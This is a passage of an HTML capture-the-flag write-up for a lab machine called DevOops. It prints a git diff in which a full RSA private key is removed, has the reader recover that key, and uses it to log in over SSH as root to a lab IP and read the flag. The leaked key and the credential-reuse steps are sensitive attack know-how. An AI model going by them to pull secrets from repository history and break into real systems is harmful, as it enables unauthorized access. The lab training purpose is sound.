+			<span style="color:#ff9d00;font-weight:700">diff</span>&nbsp;--git&nbsp;a<span style="color:#ff9d00;font-weight:700">/</span>resources<span style="color:#ff9d00;font-weight:700">/</span>integration<span style="color:#ff9d00;font-weight:700">/</span>authcredentials.key&nbsp;b<span style="color:#ff9d00;font-weight:700">/</span>resources<span style="color:#ff9d00;font-weight:700">/</span>integration<span style="color:#ff9d00;font-weight:700">/</span>authcredentials.key<br>
+			index&nbsp;44c981f..f4bde49&nbsp;100644<br>
+			---&nbsp;a<span style="color:#ff9d00;font-weight:700">/</span>resources<span style="color:#ff9d00;font-weight:700">/</span>integration<span style="color:#ff9d00;font-weight:700">/</span>authcredentials.key<br>
+			+++&nbsp;b<span style="color:#ff9d00;font-weight:700">/</span>resources<span style="color:#ff9d00;font-weight:700">/</span>integration<span style="color:#ff9d00;font-weight:700">/</span>authcredentials.key<br>
+			@@&nbsp;-1,28&nbsp;+1,27&nbsp;@@<br>
+			&nbsp;-----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+			-MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU<span style="color:#ff9d00;font-weight:700">/</span>WFI+OPQcpOVj9DdSIEde<br>
+			-8PDgpt<span style="color:#ff9d00;font-weight:700">/</span>tBpY7a<span style="color:#ff9d00;font-weight:700">/</span>xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo<span style="color:#ff9d00;font-weight:700">/</span>hfaUUyU5i<br>
+			-vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH<span style="color:#ff9d00;font-weight:700">/</span>NwYW2iovTRK<br>
+			-nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt<span style="color:#ff9d00;font-weight:700">/</span>rEgIVmrb+<br>
+			-CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc<span style="color:#ff9d00;font-weight:700">/</span>SHSE0c<br>
+			-F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH<br>
+			-uzjPbIdyEkDc3PAYP+E<span style="color:#ff9d00;font-weight:700">/</span>jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL<br>
+			-gCfN5I+xZGH19V4HPMCrK6PzskYII3<span style="color:#ff9d00;font-weight:700">/</span>i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD<br>
+			-k2X0256DbRv<span style="color:#ff9d00;font-weight:700">/</span>ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy<br>
+			-NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM<br>
+			-HSRik2J<span style="color:#ff9d00;font-weight:700">/</span>7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa<br>
+			-2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK<span style="color:#ff9d00;font-weight:700">/</span>oLc0RB<br>
+			-GLEKU6HtUuKFvlXdJ22S4<span style="color:#ff9d00;font-weight:700">/</span>rQb0RiDcU<span style="color:#ff9d00;font-weight:700">/</span>wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG<br>
+			-jwrjv<span style="color:#ff9d00;font-weight:700">/</span>loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41<br>
+			-IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw<br>
+			-+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp<span style="color:#ff9d00;font-weight:700">/</span>QYtjn<span style="color:#ff9d00;font-weight:700">/</span>ltojR16JNTKqiW<br>
+			-7vSqlsZnT9jR2syvuhhVz4Ei9yA<span style="color:#ff9d00;font-weight:700">/</span>VYZG2uiCpK0CgYA<span style="color:#ff9d00;font-weight:700">/</span>UOhz+LYu<span style="color:#ff9d00;font-weight:700">/</span>MsGoh0+yNXj<br>
+			-Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS<br>
+			-iD6fE+5<span style="color:#ff9d00;font-weight:700">/</span>i<span style="color:#ff9d00;font-weight:700">/</span>rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo<span style="color:#ff9d00;font-weight:700">/</span>PcFlfXQhrERxRXJQKPHdJP7<br>
+			-VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp<span style="color:#ff9d00;font-weight:700">/</span>INRX<br>
+			-S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6<br>
+			-md<span style="color:#ff9d00;font-weight:700">/</span>EqUtm84<span style="color:#ff9d00;font-weight:700">/</span>VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie<br>
+			-LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz<br>
+			-oAvexd1JRMkbC7YOgrzZ9iOxHP+mg<span style="color:#ff9d00;font-weight:700">/</span>LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw<br>
+			-LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=<br>
+			+MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx<span style="color:#ff9d00;font-weight:700">/</span>cvxPZX0XunSLD8veN<br>
+			+ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz<span style="color:#ff9d00;font-weight:700">/</span>uwDSE<br>
+			+23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE<br>
+			+sQ26ynmLutnd<span style="color:#ff9d00;font-weight:700">/</span>MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s<br>
+			+ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16<br>
+			+ZBlx4UG0bdxtoE8DLjfoJuWGfCF<span style="color:#ff9d00;font-weight:700">/</span>dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h<br>
+			+LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO<br>
+			+JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms<span style="color:#ff9d00;font-weight:700">/</span>2KppubiHDi9<br>
+			+oKL7XLUpSnSrWQyMGQx<span style="color:#ff9d00;font-weight:700">/</span>Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM<br>
+			+xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc<span style="color:#ff9d00;font-weight:700">/</span>YFkI9b7WCKpFgiszhw<br>
+			+vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b<span style="color:#ff9d00;font-weight:700">/</span>U3I9We1P+0nbfjYX8x<br>
+			+6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+<br>
+			+OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE<br>
+			+4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq<span style="color:#ff9d00;font-weight:700">/</span>lAesCgYEAyiS0<br>
+			+937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94<br>
+			+SQMoKu++K1nbly2YS+mv4bOanSFdc6bT<span style="color:#ff9d00;font-weight:700">/</span>SAHKdImo8buqM0IhrYTNvArN<span style="color:#ff9d00;font-weight:700">/</span>Puv4VT<br>
+			+Nszh8L9BDEc<span style="color:#ff9d00;font-weight:700">/</span>DOQQQzsKiwIHab<span style="color:#ff9d00;font-weight:700">/</span>rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4<br>
+			+eGDe3y<span style="color:#ff9d00;font-weight:700">/</span>cPfWoEs9<span style="color:#ff9d00;font-weight:700">/</span>AptjiaD03UJi9KPLegaKDZkBG<span style="color:#ff9d00;font-weight:700">/</span>mjFqFFmV<span style="color:#ff9d00;font-weight:700">/</span>vfAhyecOdmaAd<br>
+			+i<span style="color:#ff9d00;font-weight:700">/</span>Mywc<span style="color:#ff9d00;font-weight:700">/</span>vzgLjCyBUvxEhazBF4FB8<span style="color:#ff9d00;font-weight:700">/</span>CuVUtnvAWxgJpgT<span style="color:#ff9d00;font-weight:700">/</span>1vIi1M4cFpkys8CRDVP<br>
+			+6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb<br>
+			+8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV<br>
+			+RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA<br>
+			+qML<span style="color:#ff9d00;font-weight:700">/</span>WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI<br>
+			+T3Sd<span style="color:#ff9d00;font-weight:700">/</span>6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog<br>
+			+bU34EzQLp7oRU<span style="color:#ff9d00;font-weight:700">/</span>TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=<br>
+			&nbsp;-----END&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+			-
+		</div>
+	</div><br>
+	<br>
+	An SSH key was replcaed in the <code>authcredentials.key</code> file.<br>
+	The <code>-</code> is what was removed, the <code>+</code> is what was added.<br>
+	<br>
+	Take the SSH key that roosa removed and format it correctly (remove the <code>-</code>).<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;id_rsa.key</span><br>
+			-----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+			MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU<span style="color:#ff9d00;font-weight:700">/</span>WFI+OPQcpOVj9DdSIEde<br>
+			8PDgpt<span style="color:#ff9d00;font-weight:700">/</span>tBpY7a<span style="color:#ff9d00;font-weight:700">/</span>xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo<span style="color:#ff9d00;font-weight:700">/</span>hfaUUyU5i<br>
+			vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH<span style="color:#ff9d00;font-weight:700">/</span>NwYW2iovTRK<br>
+			nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt<span style="color:#ff9d00;font-weight:700">/</span>rEgIVmrb+<br>
+			CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc<span style="color:#ff9d00;font-weight:700">/</span>SHSE0c<br>
+			F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH<br>
+			uzjPbIdyEkDc3PAYP+E<span style="color:#ff9d00;font-weight:700">/</span>jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL<br>
+			gCfN5I+xZGH19V4HPMCrK6PzskYII3<span style="color:#ff9d00;font-weight:700">/</span>i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD<br>
+			k2X0256DbRv<span style="color:#ff9d00;font-weight:700">/</span>ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy<br>
+			NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM<br>
+			HSRik2J<span style="color:#ff9d00;font-weight:700">/</span>7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa<br>
+			2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK<span style="color:#ff9d00;font-weight:700">/</span>oLc0RB<br>
+			GLEKU6HtUuKFvlXdJ22S4<span style="color:#ff9d00;font-weight:700">/</span>rQb0RiDcU<span style="color:#ff9d00;font-weight:700">/</span>wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG<br>
+			jwrjv<span style="color:#ff9d00;font-weight:700">/</span>loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41<br>
+			IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw<br>
+			+XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp<span style="color:#ff9d00;font-weight:700">/</span>QYtjn<span style="color:#ff9d00;font-weight:700">/</span>ltojR16JNTKqiW<br>
+			7vSqlsZnT9jR2syvuhhVz4Ei9yA<span style="color:#ff9d00;font-weight:700">/</span>VYZG2uiCpK0CgYA<span style="color:#ff9d00;font-weight:700">/</span>UOhz+LYu<span style="color:#ff9d00;font-weight:700">/</span>MsGoh0+yNXj<br>
+			Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS<br>
+			iD6fE+5<span style="color:#ff9d00;font-weight:700">/</span>i<span style="color:#ff9d00;font-weight:700">/</span>rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo<span style="color:#ff9d00;font-weight:700">/</span>PcFlfXQhrERxRXJQKPHdJP7<br>
+			VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp<span style="color:#ff9d00;font-weight:700">/</span>INRX<br>
+			S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6<br>
+			md<span style="color:#ff9d00;font-weight:700">/</span>EqUtm84<span style="color:#ff9d00;font-weight:700">/</span>VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie<br>
+			LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz<br>
+			oAvexd1JRMkbC7YOgrzZ9iOxHP+mg<span style="color:#ff9d00;font-weight:700">/</span>LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw<br>
+			<span style="color:#7f0044;font-weight:400">LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE</span>=<br>
+			-----END&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----
+		</div>
+	</div><br>
+	<br>
+	And use it to try loggin in as different users on the file system (retrieve a list of users from <code>/etc/passwd</code>).<br>
+	This SSH key works for root!<br>
+		<div class="codebox">
+			┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#chmod&nbsp;600&nbsp;id_rsa.key</span><br>
+			┌─[✗]─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>devoops]<br>
+			└──╼&nbsp;<span style="color:#0088ff;font-weight:400">#ssh&nbsp;root@10.10.10.91&nbsp;-i&nbsp;id_rsa.key</span><br>
+			Welcome&nbsp;to&nbsp;Ubuntu&nbsp;16.04.4&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.13.0-37-generic&nbsp;i686<span style="color:#ff9d00;font-weight:700">)</span><br>
+			<br>
+			&nbsp;*&nbsp;Documentation<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>help.ubuntu.com<br>
+			&nbsp;*&nbsp;Management<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>landscape.canonical.com<br>
+			&nbsp;*&nbsp;Support<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>ubuntu.com<span style="color:#ff9d00;font-weight:700">/</span>advantage<br>
+			<br>
+			135&nbsp;packages&nbsp;can&nbsp;be&nbsp;updated.<br>
+			60&nbsp;updates&nbsp;are&nbsp;security&nbsp;updates.<br>
+			<br>
+			Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Mon&nbsp;Mar&nbsp;26&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>23<span style="color:#ff9d00;font-weight:700">:</span>48&nbsp;2018&nbsp;from&nbsp;192.168.57.1<br>
+			root@gitter<span style="color:#ff9d00;font-weight:700">:</span>~#&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;root.txt<br>
+			d4fe1e7f718...
+		</div>
+	</div><br>
+    </writeup>
+</section>
+
+</body>
+</html>
